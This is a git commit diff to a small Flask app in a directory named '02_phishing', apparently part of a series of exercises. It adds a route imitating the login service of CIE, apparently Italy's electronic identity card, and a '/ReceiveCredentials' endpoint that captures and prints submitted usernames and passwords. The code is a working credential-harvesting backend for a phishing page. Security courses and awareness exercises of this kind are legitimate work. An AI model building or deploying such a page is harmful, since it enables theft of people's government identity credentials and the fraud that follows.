f32902fc7cc47cde75d6a77548258064fe5557c1
Davide Greco <grecodavide.work@proton.me>
2026-04-22 18:56:44 +0200

    cie: add static site

--- 02_phishing/app.py
+++ 02_phishing/app.py
@@ -1,4 +1,4 @@
-from flask import Flask, render_template
+from flask import Flask, render_template, request
 
 app = Flask(__name__)
 
@@ -12,9 +12,16 @@ def home():
 def home_en():
     return render_template('landing_page_en.html')
 
-@app.route('/AuthRequestCieService')
-def cie_login():
-    return ""
+@app.route('/AuthRequestCieService', methods=['GET', 'POST'])
+def login_cie():
+    return render_template("login_cie.html")
+
+
+@app.route('/ReceiveCredentials', methods=['POST'])
+def receive():
+    print(request.form.get('username'))
+    print(request.form.get('password'))
+    return render_template("login_cie.html")
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
